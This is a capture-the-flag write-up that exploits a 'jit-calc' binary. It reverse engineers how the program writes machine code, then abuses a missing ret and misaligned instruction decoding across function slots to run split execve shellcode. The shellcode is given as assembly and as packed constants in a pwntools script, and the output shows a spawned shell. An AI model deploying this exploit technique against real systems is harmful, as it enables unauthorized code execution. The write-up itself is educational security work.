# jit-calc (splitted shellcode)

Notes:
- binary given

## Enumeration
I had some troubles in reverse engineering part. I've made wrong assumptions. Mostly because I've thought the calculator will be using stack and Polish notation to perform calculation, but it turned out the program dynamicaly writes assembly code on behalf of users to do calculations.

```bash
$ ./jit-calc
Welcome to our super fast JIT calculator
If you re looking for fast computation, you came to the right place!
None of that slow interpreted stuff here


Notice: You can only use 1000 bytes per function, so we provided 8 spaces for functions.
Code result: 123456789
Current index: 0
1: Change Index
2: Write code
3: Exit
4: Run code
2
Using option 2.
1: Finish Function
2: Write Addition
3: Write Constant Value
2
1: Add Register 1 to Register 2
2: Add Register 2 to Register 1
3: Add Register 1 to Register 1
4: Add Register 2 to Register 2
1
1: Finish Function
2: Write Addition
3: Write Constant Value
3
1: Store to register 1
2: Store to register 2
2
Enter the constant:
88888888
1: Finish Function
2: Write Addition
3: Write Constant Value
1
Current index: 0
1: Change Index
2: Write code
3: Exit
4: Run code
4
Using option 4.
Result: 54c5638
Current index: 0
1: Change Index
2: Write code
3: Exit
4: Run code
3
Using option 3.
```

I've used Ghidra to reverse engineer the program. Luckly file was not stripped. Note - I've simplified a lot underlaying functions. Especially main which in fact does way more, but I havn't used any of it's magic for exploitation and so I will not mention it.

I've started with main. Not it is quite simple. It calls init which sets stream buffering and then invokes loop() function.

```c
// simplified!

void init() {
    setvbuf(stdin, 0x0,2,0);
    setvbuf(stdout, 0x0,2,0);
    setvbuf(stderr, 0x0,2,0);
}

int main() {
    // very simplified!
    init();
    loop();
}
```

The loop function is just a one big switch waiting for user commends. The interesting part is at the beginning where program allocates some huge memory regin (readable and writable) and then let's user to write & run & change idx. 

```c
// simplified!

/*
Current index: 0
1: Change Index
2: Write code
3: Exit
4: Run code
*/
void loop() {
    char *calc_exe_mem = (char *)mmap(0x0,0x8000,3,0x22,-1,0);
    size_t idx = 0;

    size_t cmd;
    while (true) {
        scanf("%d", cmd);
        switch(cmd) {
            case 1:
                change_idx(&idx);
                break;

            case 2:
                write_code(idx, calc_exe_mem);
                break;

            case 3:
                exit(0);

            case 4:
                run_code(idx, calc_exe_mem);
                break;
        }
    }
}
```

When playing with the binary we saw a

 `"Notice: You can only use 1000 bytes per function, so we provided 8 spaces for functions."`

 information. Looking at a above function we can guess that program will use the calc_exe_mem as a space for functions and idx is for keeping track on a current function.

 But to be sure let's look at change_idx function. It is perhaps the easiest one:

 ```c
 // simplified!
void change_idx(size_t *idx) {
    size_t new_idx;
    puts(""What index would you like to change to (0-9)");
    scanf("%d", &new_idx);

    if (new_idx > -1 && new_idx < 8) *idx = new_idx;
}
 ```

 It just reads a new index from user and if it is in a valid range [0 - 7] then the current index get's updated.

 Not let's check the logic behind run_code.

 ```c
// simplified!
#define FUNC_LEN 1000

void run_code(size_t idx, char *calc_exe_mem) {
    mprotect(calc_exe_mem, 0x8000, 5);
    char *func = calc_exe_mem[idx * FUNC_LEN];
    func();
}
 ```

It starts with setting a exec rights on calc_exe_mem and then calls a function under current index. Hmm, so this functions must be created dynamicaly! Let's check how in write_code function!

```c
// simplified!

/*
1: Finish Function
2: Write Addition
3: Write Constant Value
*/
void write_code(size_t idx, char *calc_exe_mem) {
    mprotect(calc_exe_mem, 0x8000, 3);
    char *func_start = calc_exe_mem[idx * FUNC_LEN];
    char *func_ptr = func_start;
    
    size_t cmd, option;
    while (true) {
        if (func_ptr > func_start + 0x3d9) return;

        scanf("%d", &cmd);
        switch (cmd) {
            case 1:
                *func_ptr = 0xc3; // ret
                return;

            case 2:
                puts("1: Add Register 1 to Register 2");
                puts("2: Add Register 2 to Register 1");
                puts("3: Add Register 1 to Register 1");
                puts("4: Add Register 2 to Register 2");
                *func_ptr = 0x48;
                *func_ptr[1] = 0x01

                scanf("%d", &option);
                if (option == 1)
                    // movabs rax, rbx
                    *func_ptr[2] = 0xc0
                else if (option == 2)
                    // movabs rbx, rax
                    *func_ptr[2] = 0xc3
                else if (option == 3)
                    // movabs rax, rax
                    *func_ptr[2] = 0xd8
                else
                    // movabs rbx, rbx
                    *func_ptr[2] = 0xdb

                func_ptr += 3;
                break;

            case 3:
                puts("1: Store to register 1");
                puts("2: Store to register 2");
                *func_ptr = 0x48;
                
                scanf("%d", &option);
                if (option == 1)
                    // movabs rax, val
                    *func_ptr[1] = 0xb8;
                else
                    // movabs rbx, val
                    *func_ptr[1] = 0xb9; // TODO sprawdz
                
                puts("Enter the constant:");
                int val;
                scanf("%d", &val);
                memcpy(&func_ptr[2], &val, 8);

                func_ptr += 10;
                break;
        }
    } 
}
```

Look complicated? Trust me, it is not that bad after I've simplified it a lot! The function starts with restoring a read write privilages to the calc_exe_mem (as they might be changed in run_code). 
Then it starts implementing a function. If we look closely we can see that it just embededs machine code into memory.
For example:
`\xc3` is an opcode for ret instruction, where `\x48\x01\xc0` stands for `mov rax, rax`. When a user decides she/he wan't to leave function editor there is an extra ret instruction embeded before the function quites.

## Exploitation
So the first question should be - is it possible to get a shell using just two registers and movabs instructions? Maybe, but I have no idea how. Therefore I've picked other path. I knew I need to find a way to use other instructions.

### Bypassing ret
Before I've mentioned that "When a user decides she/he wan't to leave function editor there is an extra ret instruction embeded before the function quites". This is no entirely true.

```c
void write_code(size_t idx, char *calc_exe_mem) {
    [...]
    while (true) {
        if (func_ptr > func_start + 0x3d9) return;
        [...]
    }
```

The program forgets to inject ret instruction if the user run's out of space (she/he provides instructions that take 0x3d9 (985) or more bytes in total). The space allocated for each function is equal to 1000. This means that unfortunetely we won't be able to overflow to other function as we can create at maximum 984 + 10 = 994 bytes long function.
Let's check if our assumptions are correct. I'm using pwntools script to speed up exploitation and testing (you can always check full exploit [here](exp.py) to get full functions implementation)

```python
p = proccess('./jit-calc')

read_welcome_msg()

start_writing_code()
for i in range(9):
    write_addition(1)
for i in range(96):
    write_constant_value(1, 0x4142434445464748)

run_code()
```
 
Let's run it:

```bash
$ python3 exp.py
[+] Starting local process './jit-calc': pid 4252
[*] Process './jit-calc' stopped with exit code -11 (SIGSEGV) (pid 4252)
```

We got SIGSEV, but we should be happy about that. This means that's something unexpected is happening. Something that developer forgot about! Let's breakpoint at callCode function to see how's the memory layout look like:

```gdb
$python3 exp.py local debug
gef➤  b callCode
gef➤  c
Continuing.
Breakpoint 1, 0x0000000000400a94 in callCode ()
gef➤  vmmap // to find calc_exe_mem
Start              End                Offset             Perm Path
[...]
0x00007f93d547c000 0x00007f93d547e000 0x00000000001eb000 rw- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007f93d547e000 0x00007f93d5482000 0x0000000000000000 rw- 
0x00007f93d5482000 0x00007f93d54a9000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.27.so
0x00007f93d5689000 0x00007f93d568b000 0x0000000000000000 rw- 
0x00007f93d56a0000 0x00007f93d56a9000 0x0000000000000000 r-x // <-- here
0x00007f93d56a9000 0x00007f93d56aa000 0x0000000000027000 r-- /lib/x86_64-linux-gnu/ld-2.27.so
0x00007f93d56aa000 0x00007f93d56ab000 0x0000000000028000 rw- /lib/x86_64-linux-gnu/ld-2.27.so
0x00007f93d56ab000 0x00007f93d56ac000 0x0000000000000000 rw- 
0x00007ffe5f615000 0x00007ffe5f636000 0x0000000000000000 rw- [stack]
[...]
gef➤  x/200i 0x00007f93d56a0000
   0x7f93d56a0000:	add    rbx,rax
   [...]
   0x7f93d56a0018:	add    rbx,rax
   0x7f93d56a001b:	movabs rax,0x4142434445464748
   [...]
   0x7f93d56a03d1:	movabs rax,0x4142434445464748
   0x7f93d56a03db:	add    BYTE PTR [rax],al
   0x7f93d56a03dd:	add    BYTE PTR [rax],al
   0x7f93d56a03df:	add    BYTE PTR [rax],al
   0x7f93d56a03e1:	add    BYTE PTR [rax],al
   [...]
   0x7f93d56a03e7:	add    BYTE PTR [rax],al
   0x7f93d56a03e9:	add    BYTE PTR [rax],al
   [...]
```

We start by setting breakpoint at entry to callCode function and then we continue till program execution hits it. Then we use vmmap command (or look at register) to find calc_exe_mem address. We know that the memory regin has read & exe & ~write privilages. Finaly we deassemble the function at this address.

We can now analyse the function:
-  [0x7f93d56a0000-0x7f93d56a001a] contains 9 * `add rbx,rax` instructions,
-  [0x7f93d56a001b-0x7f93d56a03da] contains 96 * `movabs rax,0x4142434445464748` instructions,
-  0x7f93d56a03db+ contains `add BYTE PTR [rax],al` instructions

Wait! Where did `add BYTE PTR [rax], al` came from??!!! Let's find out:

```gdb
gef➤  x/2gx 0x7f93d56a03db
0x7f93d56a03db:	0x0000000000000000	0x0000000000000000
gef➤  p $rax
$1 = 0x7f93d56a0000
```

Hmm.. so the gdb interprets `\x00\x00` as a valid `add BYTE PTR [rax],al` instruction. And gdb is right, because `\x00\x00` is an opcode for `add BYTE PTR [rax],al`. This also explains why our program SIGSEVs as rax is pointing to the begining of our function and this memory is not writeble now.

## Creating assymetry
But how or if can we exploit it? The `add BYTE PTR [rax],al` instruction itself is not very helpful. But it also takes two bytes. Moreover we can write to next function at index one starting at address 0x7f93d56a03e8 (0x7f93d56a0000 + 1000). So what will happen if we now start editing that function?
Let's say our function at index one will be just
 
```assembly
movabs rax, 0x5152535455565758
ret
```

And the updated exploit code:

```python
p = proccess('./jit-calc')

read_welcome_msg()

start_writing_code()
for i in range(9):
    write_addition(1)
for i in range(96):
    write_constant_value(1, 0x4142434445464748)

swap_index(1)
start_writing_code()
write_constant_value(1, 0x5152535455565758)
end_writing_code()

swap_index(0)
run_code()
```

And again let's break at callCode and examine the memory under 0x00007f93d56a0000:

```gdb
$python3 exp.py local debug
gef➤  b callCode
gef➤  c
Continuing.
Breakpoint 1, 0x0000000000400a94 in callCode ()
gef➤  x/200i 0x00007f93d56a0000
   0x7f93d56a0000:	add    rbx,rax
   [...]
   0x7f93d56a0018:	add    rbx,rax
   0x7f93d56a001b:	movabs rax,0x4142434445464748
   [...]
   0x7f78f9d503d1:	movabs rax,0x4142434445464748
   0x7f78f9d503db:	add    BYTE PTR [rax],al
   0x7f78f9d503dd:	add    BYTE PTR [rax],al
   0x7f78f9d503df:	add    BYTE PTR [rax],al
   0x7f78f9d503e1:	add    BYTE PTR [rax],al
   0x7f78f9d503e3:	add    BYTE PTR [rax],al
   0x7f78f9d503e5:	add    BYTE PTR [rax],al
   0x7f78f9d503e7:	add    BYTE PTR [rax-0x48],cl
   0x7f78f9d503ea:	pop    rax
   0x7f78f9d503eb:	push   rdi
   0x7f78f9d503ec:	push   rsi
   0x7f78f9d503ed:	push   rbp
   0x7f78f9d503ee:	push   rsp
   0x7f78f9d503ef:	push   rbx
   0x7f78f9d503f0:	push   rdx
   0x7f78f9d503f1:	push   rcx
   0x7f78f9d503f2:	ret    
   0x7f78f9d503f3:	add    BYTE PTR [rax],al
   [...]
gef➤  x/2gx 0x7f78f9d503e7
0x7f78f9d503e7:	0x5455565758b84800	0x00000000c3515253
```

Ha! Can you believe this? We just got a bunch of new useful instructions! This is because:
`\x00\x48` got interpreted as `add BYTE PTR [rax-0x48],cl` and as `\x48` belonged to `movabs`. This means that the program will see `\x00\x48` and then will see `\xb8` which will get interpreted as `pop rax`. Then we execute `\x58` as `push rdi`, `\x57` as push rsi, etc. But wait! We do control `\x57\x56\x55\x54\x53\x52\x51`, so we just gain nice code execution!!!

### Combining shellcode chunks
The problem is that we have just len(`\x57\x56\x55\x54\x53\x52\x51`) = 7 bytes to place our shellcode which is not much :/ Then again `movabs` is interpreted. I don't think there exists such a short shellcode and so we must bypass this limitation. We can do this using `jmp` instruction! We will just jump between our controlled code!

We can inject shellcode splitted as this:

```assembly
section .text
	global _start

_start:
    ; assumption $rbx contains /bin/sh
    push 0x42
    pop rax
    inc ah
    jmp _slot2
    add [rax], al

_slot2:
    cqo
    push rdx
    push rbx
    pop rdi
    jmp _slot3
    add [rax], al

_slot3:
    push rdi
    push rsp
    pop rsi
    jmp _slot4
    add [rax], al

_slot4:
    mov r8, rdx
    mov r10, rdx
    jmp _slot5

_slot5:
    syscall
```

This is modified shellcode from http://shell-storm.org/shellcode/
We can inject it like this:

```python
p = proccess('./jit-calc')

read_welcome_msg()

start_writing_code()
for i in range(8):
    write_addition(1)
for i in range(95):
    write_constant_value(1, e.got['exit']) # [1]
write_constant_value(2, BINSH_HEX - e.got['exit'])
write_addition(1) # add rbx,rax


swap_index(1)
start_writing_code()
write_constant_value(1, 0x00000000000008eb)  
write_constant_value(1, 0x0003ebc4fe58426a) # push 0x42; pop rax; inc ah;
write_constant_value(1, 0x0003eb5f53529948) # cqo; push rdx; push rbx; pop rdi;
write_constant_value(1, 0x02ebd089495e5457) # push rdi; push $rsp; pop rsi; mov r8,rdx;
write_constant_value(1, 0x000000050fd28949) # mov r10,rdx; syscall
end_writing_code()


swap_index(0)
run_code()

p.interactive()
```

Note that I've added two things:
- [1] when filling function under index zero instead of placing some random value 0x41424344454647 I've placed got@exit address as it just has to some valid address (remember, there are `mov [rax], al` instructions between function zero and function one)
- [2] I've used movabs instructions to place '/bin/sh' inside rbx. But as the last instruction in function zero before the gap is `mov rbx, rax` therefore I had to substract it.

Now we can check our [exploit](exp.py):

```python
$python3 exp.py local
$ python3 exp2.py local
[*] '/home/k/ritsec/iit-calc/jit-calc'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[!] Could not find executable 'jit-calc' in $PATH, using './jit-calc' instead
[+] Starting local process './jit-calc': pid 9744
[*] [x] filled 987 bytes and created magic assymetry
[*] Switching to interactive mode
$ id
uid=1000(k) gid=1000(k) groups=1000(k),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),132(libvirt)
```
